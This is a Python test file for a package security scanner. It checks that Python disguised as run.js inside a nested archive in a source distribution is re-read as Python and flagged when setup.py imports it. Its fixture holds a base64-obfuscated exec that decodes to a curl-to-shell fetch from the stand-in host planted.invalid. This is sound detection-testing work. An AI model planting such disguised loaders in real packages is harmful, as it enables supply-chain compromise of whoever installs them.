"""A file whose bytes are another language than its name says is read as that language too (evasion
suite B): Python named `run.js` inside an archive passed with nothing said.

Fixtures are built here from harmless strings; the host is `planted.invalid`. Nothing is run.
"""

from __future__ import annotations

import io
import json
import tarfile
import zipfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared.content_language import ContentLanguage
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.paths import ContainerPaths

PYTHON = (
    "import base64, os\n"
    "def g(s):\n"
    "    return base64.b64decode(s).decode()\n"
    "exec(g('aW1wb3J0IG9zCm9zLnN5c3RlbSgnY3VybCAtcyBodHRwczovL3BsYW50ZWQuaW52YWxpZC9pIHwgc2gnKQo='))\n"
)
"""Decodes to `os.system('curl -s https://planted.invalid/i | sh')`; only the Python rules read the decode."""
JAVASCRIPT = (
    "const cp = require('child_process');\nmodule.exports = () => { cp.execSync('true'); };\n"
)
DECODE_EXEC = "SUSPECT.DECODE_EXEC.001"
SHELL = "#!/bin/sh\nif [ -d /tmp ]; then\n  echo ok\nfi\nfor f in a b; do echo $f; done\n"


class TestSecondReading:
    def test_python_named_javascript_is_read_as_python(self) -> None:
        assert ContentLanguage.second_reading(PYTHON, "javascript") == "python"

    def test_python_named_python_has_no_second_reading(self) -> None:
        assert ContentLanguage.second_reading(PYTHON, "python") is None

    def test_javascript_holding_a_python_line_in_a_string_is_javascript_only(self) -> None:
        text = "const doc = `\nimport os\ndef f():\n`;\nconsole.log(doc);\n"
        assert ContentLanguage.second_reading(text, "javascript") is None

    def test_javascript_named_python_is_read_as_javascript(self) -> None:
        assert ContentLanguage.second_reading(JAVASCRIPT, "python") == "javascript"

    def test_shell_named_javascript_is_read_as_shell(self) -> None:
        assert ContentLanguage.second_reading(SHELL, "javascript") == "shell"

    def test_shell_inside_a_javascript_template_is_javascript_only(self) -> None:
        text = f"const script = `{SHELL}`;\nmodule.exports = script;\n"
        assert ContentLanguage.second_reading(text, "javascript") is None

    def test_typescript_holding_a_shell_script_in_a_template_is_typescript_only(self) -> None:
        text = f"const script: string = `{SHELL}`;\nexport function run(): string {{ return script; }}\n"
        assert ContentLanguage.second_reading(text, "typescript") is None

    def test_python_with_a_data_name_is_read_as_python(self) -> None:
        assert ContentLanguage.second_reading(PYTHON, None) == "python"
        assert ContentLanguage.second_reading(PYTHON, "markdown") == "python"

    def test_a_document_quoting_code_is_no_program(self) -> None:
        doc = "# Install\n\nRun this:\n\n```\nimport os\nos.system('make')\n```\n"
        assert ContentLanguage.second_reading(doc, "markdown") is None
        assert ContentLanguage.second_reading(SHELL.replace("#!/bin/sh\n", ""), None) is None

    def test_a_structured_format_is_not_re_read(self) -> None:
        assert ContentLanguage.second_reading(PYTHON, "json") is None
        assert ContentLanguage.second_reading(PYTHON, "yaml") is None


class TestReadingPaths:
    def test_round_trip(self) -> None:
        path = ContainerPaths.reading("vendor/bundle.zip!run.js", "python")
        assert path == "vendor/bundle.zip!run.js#as-python.py"
        assert ContainerPaths.read_from(path) == "vendor/bundle.zip!run.js"

    def test_an_ordinary_name_is_no_reading(self) -> None:
        assert ContainerPaths.read_from("lib/#as-notes.md") is None
        assert ContainerPaths.read_from("lib/run.js") is None


class TestInAnArchive:
    @staticmethod
    def sdist(tmp_path: Path, member: str, text: str, setup_tail: str = "") -> Path:
        """A source distribution shipping `vendor/bundle.zip`, which holds `member`."""
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w") as z:
            z.writestr(member, text)
        setup = "from setuptools import setup\nsetup(name='demo')\n" + setup_tail
        files = {
            "demo-1.0.0/PKG-INFO": b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\n",
            "demo-1.0.0/setup.py": setup.encode(),
            "demo-1.0.0/vendor/bundle.zip": inner.getvalue(),
        }
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name, data in files.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        path = tmp_path / "demo-1.0.0.tar.gz"
        path.write_bytes(buf.getvalue())
        return path

    @staticmethod
    def findings(target: Path) -> list[tuple[str, str]]:
        return [(path, rule) for path, rule, _ in TestInAnArchive.graded(target)]

    @staticmethod
    def graded(target: Path) -> list[tuple[str, str, str]]:
        config = Config.default().with_overrides(use_cache=False, offline=True)
        result = Scanner(config).scan(target)
        return [(f.location.path or "", f.rule_id, f.severity.name) for f in result.findings]

    def test_the_module_setup_py_imports_is_the_python_hidden_under_its_name(
        self, tmp_path
    ) -> None:
        graded = self.graded(self.sdist(tmp_path, "run.js", PYTHON, setup_tail="import run\n"))
        reading = "demo-1.0.0.tar.gz!demo-1.0.0/vendor/bundle.zip!run.js#as-python.py"
        assert any(
            path == reading and severity in ("HIGH", "CRITICAL") for path, _, severity in graded
        ), json.dumps(graded)

    def test_without_the_import_the_hidden_python_is_not_install_time(self, tmp_path) -> None:
        graded = self.graded(self.sdist(tmp_path, "run.js", PYTHON))
        reading = "demo-1.0.0.tar.gz!demo-1.0.0/vendor/bundle.zip!run.js#as-python.py"
        assert not any(
            path == reading and severity in ("HIGH", "CRITICAL") for path, _, severity in graded
        ), json.dumps(graded)

    def test_python_named_run_js_is_read_as_python(self, tmp_path) -> None:
        found = self.findings(self.sdist(tmp_path, "run.js", PYTHON))
        reading = "demo-1.0.0.tar.gz!demo-1.0.0/vendor/bundle.zip!run.js#as-python.py"
        assert (reading, DECODE_EXEC) in found, json.dumps(found)

    def test_javascript_named_run_js_has_no_second_reading(self, tmp_path) -> None:
        found = self.findings(self.sdist(tmp_path, "run.js", JAVASCRIPT))
        assert not any(ContainerPaths.read_from(path) for path, _ in found)

    def test_a_reading_does_not_repeat_its_files_findings(self, tmp_path) -> None:
        found = self.findings(self.sdist(tmp_path, "run.js", PYTHON))
        readings = {
            (ContainerPaths.read_from(path), rule)
            for path, rule in found
            if ContainerPaths.read_from(path)
        }
        assert not readings & set(found)


class TestHiddenModules:
    def test_a_reading_is_the_module_its_name_would_be(self) -> None:
        from cordon_scanner.engine.closure import ImportClosure

        hidden = ImportClosure.hidden_modules(
            [
                "setup.py",
                "vendor/bundle.zip!inner.tgz!run.js#as-python.py",
                "tools/run.js#as-python.py",
            ]
        )
        assert hidden["run"] == [
            "tools/run.js#as-python.py",
            "vendor/bundle.zip!inner.tgz!run.js#as-python.py",
        ]
        assert hidden["tools.run"] == ["tools/run.js#as-python.py"]
        assert "setup" not in hidden

    def test_an_import_that_resolves_to_a_shipped_module_is_not_redirected(self) -> None:
        from cordon_scanner.engine.closure import ImportClosure

        sources = {
            "setup.py": "import run\n",
            "run.py": "x = 1\n",
            "lib/run.js#as-python.py": "y = 2\n",
        }
        assert ImportClosure.resolve({"setup.py"}, sources) == {"run.py"}

    def test_an_unshipped_import_with_no_hidden_module_stays_third_party(self) -> None:
        from cordon_scanner.engine.closure import ImportClosure

        sources = {"setup.py": "import skbuild\n", "lib/run.js#as-python.py": "y = 2\n"}
        assert ImportClosure.resolve({"setup.py"}, sources) == set()
